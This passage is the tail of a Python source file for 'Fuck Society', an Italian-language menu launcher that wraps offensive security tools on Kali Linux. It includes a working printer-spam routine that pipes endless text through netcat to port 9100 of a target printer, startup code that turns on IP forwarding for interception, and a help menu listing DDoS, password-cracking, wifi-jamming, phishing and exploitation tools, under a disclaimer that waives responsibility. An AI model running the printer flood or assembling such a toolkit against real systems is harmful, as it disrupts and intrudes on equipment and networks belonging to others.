                rc_num = 0
                if argument2 == None:
                    argument2 = "normal"
                print("")
                print("[%s+%s] Spamming Avviato > %s"%(bright_green,end, argument2))
                print("[%s*%s] Stampante: %s"%(bright_yellow,end,option))
                print("[%s*%s] Messaggio: %s"%(bright_yellow,end,argument))
                print("")
                print("-# Ctrl + C per fermare")
                print("")
                while True:
                    try:
                        sys.stdout.write("\r" + "[%s*%s] Richieste inviate: %s"%(bright_yellow,end,rc_num) + " ")
                        sys.stdout.flush()
                        os.system("yes %s | nc -q 0 %s 9100"%(argument,option))
                        time.sleep(mode)
                        rc_num += 1
                    except (KeyboardInterrupt,EOFError):
                        print("\n[%s-%s] Spamming Interrotto"%(red,end))
                        return menu()
            else:
                print("-# %sErrore%s: Messaggio richiesto"%(red,end))
                return menu()
        else:
            print("")
            print("-# Uso: $ printerspam <printer ip> <message to spam> [spam mode]")
            print("")
            print("-# Funziona con le stampanti con la porta 9100 aperta")
            print("")
            print("-# %sSpam Mode%s:"%(bright_green,end))
            print(" [ slow / normal (default) / fast / ultra ]")
            print("")
            return menu()
    elif command == 'httrack':
        if option:
            os.system("gnome-terminal -- httrack %s -O Logs/httrack/%s/"%(option, option))
            print("-# Dati salvati in %sLogs/httrack/%s/%s"%(blue,option,end))
        else:
            print("-# Uso: $ httrack <indirizzo>")
        return menu()
    elif command == 'metagoofil':
        file_types = ["pdf","doc","xls","ppt","odp","ods","docx","xlsx","pptx"]
        if option:
            if "." not in option or "www." in option or "http://" in option or "https://" in option:
                print("-# %sErrore%s: Indirizzo non valido"%(red,end))
                return menu()
            if argument:
                if argument not in file_types:
                    print("-# %sErrore%s: Formato non valido"%(red,end))
                    return menu()
                os.system("metagoofil -d %s -t %s -o Logs/MetaGF/ -f metagf.html"%(option, argument))
                print("-# File salvati in %sLogs/MetaGF/metagf.html%s (se scaricati)"%(blue,end))
                print("")
            else:
                print("-# %sErrore%s: Tipo di file richiesto"%(red,end))
        else:
            print("")
            print("-# Uso: $ metagoofil <domain (example.com)> <filetype da scaricare>")
            print("")
            print("-# %sFileType%s:"%(bright_green,end))
            print(" [ pdf / doc / xls / ppt / odp / ods / docx / xlsx / pptx ]")
            print("")
            print("-# %sAttenzione%s:"%(bright_yellow,end))
            print(" Per scaricare molteplici file digita i 'FileTypes' nel seguente modo:")
            print(" %spdf,doc,xls,...%s"%(blue,end))
            print("")
        return menu()
    elif command == "lynis":
        print("")
        os.system("lynis audit system")
        print("")
        return menu()
    elif command == 'searchsploit':
        if option:
            print("")
            os.system(command_input)
            print("")
        else:
            print("-# Uso: $ searchsploit <parametro di ricerca>")
        return menu()

    # WAN
    elif command == 'ngrok':
        ngrok_srvc_list = ["tcp","http","tsl"]
        if option in ngrok_srvc_list:
            try:
                if int(argument) < 1 or int(argument) > 65535:
                    print("-# %sErrore%s: Porta non valida"%(red,end))
                    return menu()
            except ValueError:
                print("-# %sErrore%s: Porta non valida"%(red,end))
                return menu()
            except TypeError:
                print("-# %sErrore%s: Porta richiesta"%(red,end))
                return menu()
            os.system("gnome-terminal -- ngrok %s %s"%(option, argument))
            return menu()
        if option == "" or option == None:
            print("-# Uso: $ ngrok <tcp/http/tsl> <port>")
            return menu()
        if option not in ngrok_srvc_list:
            print("-# %sErrore%s: Argomenti non validi"%(red,end))
            return menu()

    else: # else input
        print("-# %sErrore%s: Comando non valido - %shelp%s per i comandi"%(red,end, blue,end))
        return menu()

def help():
    print("                                                                                           ") ; sleep(.01)
    print("%sComandi%s:                                                                               "%(bright_green+underline, end)) ; sleep(.01)
    print("$ help   - info - reload  - net_restart  - ping *  - search * - ftp  - quit/exit           ") ; sleep(.01)
    print("$ banner - kill - restart - ifconfig [*] - getip * - updatedb - os *                       ") ; sleep(.01)
    print("                                                                                           ") ; sleep(.01)
    print("%sSniffing & Spoofing%s:                                                                   "%(bright_green+underline,end)) ; sleep(.01)
    print("$ bettercap  - ettercap - morpheus - mitmf  - voiphopper *  - bluelog  - p0f               ") ; sleep(.01)
    print("$ wireshark  - cdpsnarf - sslstrip - mitmap - cookie-cadger - driftnet                     ") ; sleep(.01)
    print("$ torghost * - macchanger                                                                  ") ; sleep(.01)
    print("                                                                                           ") ; sleep(.01)
    print("%sPassword Attacks%s:                                                                      "%(bright_green+underline, end)) ; sleep(.01)
    print("$ findmyhash *    - ioscrack *  - gen2kr *                                                 ") ; sleep(.01)
    print("$ hash-identifier - hashcrack * - hashbuster                                               ") ; sleep(.01)
    print("                                                                                           ") ; sleep(.01)
    print("%sVulnerability Scanners%s:                                                                "%(bright_green+underline,end)) ; sleep(.01)
    print("$ dtect  - red_hawk - xsstracer * - xsstrike  - sn1per * - nikto * - dsxs * - webscarab    ") ; sleep(.01)
    print("$ vega   - wpscan * - xsssniper * - sslscan * - vbscan * - zaproxy - a2sv * - joomscan *   ") ; sleep(.01)
    print("$ owscan - sslyze * - skipfish *  - wafw00f * - fimap *  - droopescan *                    ") ; sleep(.01)
    print("                                                                                           ") ; sleep(.01)
    print("%sInformation Gathering%s:                                                                 "%(bright_green+underline,end)) ; sleep(.01)
    print("$ cewl * - geoip * - knockmail - theharvester * - infoga *    - operativef  - credmap *    ") ; sleep(.01)
    print("$ bingoo - whois * - uniscan * - urlextractor * - cpscan *    - netdiscover - parsero *    ") ; sleep(.01)
    print("$ dhcpig - inspy * - dirbuster - smtpuserenum * - recon-ng    - automater * - sshscan *    ") ; sleep(.01)
    print("$ drup * - siege * - xattacker - angryfuzzer *  - cutycapt *  - snmpcheck * - hping3 *     ") ; sleep(.01)
    print("$ nmap * - maltego - ip2host * - ciscotorch *   - dnsmap *    - breacher *  - crips        ") ; sleep(.01)
    print("$ amap * - miranda - dnsenum * - instarecon *   - dotdotpwn * - tulpar *    - pentmenu     ") ; sleep(.01)
    print("$ dirb * - zenmap  - intrace * - sublist3r *    - cr3dov3r *  - whatweb *   - dmitry *     ") ; sleep(.01)
    print("$ sechub - devploit                                                                        ") ; sleep(.01)
    print("                                                                                           ") ; sleep(.01)
    print("%sWeb Hacking%s:                                                                           "%(bright_green+underline,end)) ; sleep(.01)
    print("$ sqlmap * - nosqlmap  - fbht   - blazy   - brutesploit  - blackhydra - icloudbrutter *    ") ; sleep(.01)
    print("$ commix * - httrack * - jsql   - xhydra  - metagoofil * - instaburst - goldeneye *        ") ; sleep(.01)
    print("$ medusa * - burpsuite - t50 *  - ufonet  - torshammer * - cheetah *  - thcssldos *        ") ; sleep(.01)
    print("$ xerxes * - ipmipwn * - zambie - sqldict - powerfuzzer  - ddos *                          ") ; sleep(.01)
    print("                                                                                           ") ; sleep(.01)
    print("%sWireless Attacks%s:                                                                      "%(bright_green+underline,end)) ; sleep(.01)
    print("$ airgeddon - wpsbreaker - fluxion  - wifiphisher *                                        ") ; sleep(.01)
    print("$ netattack - wifijammer - fakeauth - wifite                                               ") ; sleep(.01)
    print("                                                                                           ") ; sleep(.01)
    print("%sExploitation Tools%s:                                                                    "%(bright_green+underline,end)) ; sleep(.01)
    print("$ routersploit  - eggshell - debinject - jexboss * - l0l - xspy - arcanus - koadic - chaos ") ; sleep(.01)
    print("$ shellsploit   - pybomber - zirikatu  - pentestly - msfconsole - astroid - weeman - kayak ") ; sleep(.01)
    print("$ overthruster  - yersinia - armitage  - ciscoge * - termineter - wirespy - brutal - u3pwn ") ; sleep(.01)
    print("$ microsploit   - ezsploit - setoolkit - evildroid - darksploit - ngrok * - fatrat - saint ") ; sleep(.01)
    print("$ printerspam * - kautilya - responder - beelogger - socialfish - wole *  - eflood         ") ; sleep(.01)
    print("$ onelin3r                                                                                 ") ; sleep(.01)
    print("                                                                                           ") ; sleep(.01)
    print("%sAll-In-One%s:                                                                            "%(bright_green+underline, end)) ; sleep(.01)
    print("$ hakkuf - sb0x - inguma - penbox - simple-ducky - discover - zarp - atscan - websploit    ") ; sleep(.01)
    print("$ trity  - ktfconsole    - dzjecter                                                        ") ; sleep(.01)
    print("                                                                                           ") ; sleep(.01)
    print("%sOthers%s:                                                                                "%(bright_green+underline,end)) ; sleep(.01)
    print("$ lynis - searchsploit *                                                                   ") ; sleep(.01)
    print("                                                                                           ") ; sleep(.01)
    print(" %s*%s : Argomento/i richiesto/i. Digita il nome del tool per i suoi comandi.              "%(bright_yellow,end)) ; sleep(.01)
    print("                                                                                           ") ; sleep(.01)
    return menu()
################################################################################
def startup():
    os.system("rm Logs/verify_first_boot.txt")
    logo = "-# Welcome To %sFuck Society%s - %s ~# %s #~\n"%(red,end,versione,autore)
    for l in logo:
        sys.stdout.write("%s"%(l))
        sys.stdout.flush()
        time.sleep(.022)
    car = "-# Tools Totali: %s\n"%(Tools)
    for l in car:
        sys.stdout.write("%s"%(l))
        sys.stdout.flush()
        time.sleep(.022)
    car = "-# Avvio i servizi"
    for l in car:
        sys.stdout.write("%s"%(l))
        sys.stdout.flush()
        time.sleep(.022)
    os.system("updatedb")
    sys.stdout.write(".")
    sys.stdout.flush()
    os.system("service postgresql start")
    sys.stdout.write(".")
    sys.stdout.flush()
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    sys.stdout.write(".")
    sys.stdout.flush()
    try:
        time.sleep(.1)
    except (KeyboardInterrupt,EOFError):
        exit()
    sys.stdout.write(" %sOK%s\n\n"%(bright_green,end))
    sys.stdout.flush()
    print("")
    return menu()
def logo_menu():
    sys.stdout.write(end)
    sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=28, cols=91))
    os.system("reset")
    print("                                                                                           "); sleep(.02)
    print("                                                                                           "); sleep(.02)
    print("                             d88888b db    db  .o88b. db   dD                              "); sleep(.02)
    print("                             88'     88    88 d8P  Y8 88 ,8P'                              "); sleep(.02)
    print("                             88ooo   88    88 8P      88,8P                                "); sleep(.02)
    print("                             88~~~   88    88 8b      88`8b                                "); sleep(.02)
    print("                             88      88b  d88 Y8b  d8 88 `88.                              "); sleep(.02)
    print("                             YP      'Y8888P'  `Y88P' YP   YD                              "); sleep(.02)
    print("                                                                                           "); sleep(.02)
    print("                 .d8888.  .d88b.   .o88b. d8888b d88888b d888888b db    db                 "); sleep(.02)
    print("                 88'  YP .8P  Y8. d8P  Y8  `88'  88'     '~~88~~' `8b  d8'                 "); sleep(.02)
    print("                 `8bo.   88    88 8P        88   88ooooo    88     `8bd8'                  "); sleep(.02)
    print("                   `Y8b. 88    88 8b        88   88~~~~~    88       88                    "); sleep(.02)
    print("                 db   8D `8b  d8' Y8b  d8  .88.  88.        88       88                    "); sleep(.02)
    print("                 `8888Y'  `Y88P'   `Y88P' Y8888P Y88888P    YP       YP                    "); sleep(.02)
    print("                                                                                           "); sleep(.02)
    print("                                                                                           "); sleep(.02)
    try:
        o = open("Logs/verify_first_boot.txt")
        return startup()
    except IOError:
        return menu()
################################################################################
def exit():
    sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=24, cols=80))
    os.system("clear")
    print("")
    sys.stdout.write("-# Fermo i servizi ")
    sys.stdout.flush()
    os.system("service postgresql stop && echo 0 > /proc/sys/net/ipv4/ip_forward")
    sys.stdout.write("- %sOK%s\n"%(bright_green,end))
    sys.stdout.flush()
    print("")
    sys.exit()
def info():
    print("") ; sleep(.02)
    print("-# Versione      - %s"%(versione)) ; sleep(.02)
    print("-# Autore        - %s"%(autore)) ; sleep(.02)
    print("-# CompatibilitÃ  - %sKali Linux (32/64 bit)%s"%(blue,end)) ; sleep(.02)
    print("") ; sleep(.02)
    return menu()
################################################################################
def firststartup():
    os.system("clear")
    print("""
-# %sCondizioni%s:
   Rubare dati, invadere la Privacy, violare sistemi altrui e altro ancora
   sono reati perseguibili penalmente. Detto ciÃ², non mi assumo nessuna
   responsabilitÃ  per l'uso che ne farai di questo programma.
   %sPensa prima di premere invio!%s
    """%(underline+bright_green,end, red,end)) ; sleep(.05)
    try:
        startup_cond = raw_input("(Premi invio per continuare) > ")
        os.system("echo 'file destinato al macello' > Logs/verify_first_boot.txt") # verifica primo avvio
        logo_menu()
    except EOFError:
        sys.exit("\n")
    except KeyboardInterrupt:
        sys.exit("\n")

if __name__ == "__main__":
    sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=24, cols=80))
    try:
        installer_done = open("Tools/Complete.txt")
        firststartup()
    except IOError:
        sys.exit("-# Esegui %sinstaller.py%s per usare il programma"%(bright_green,end))
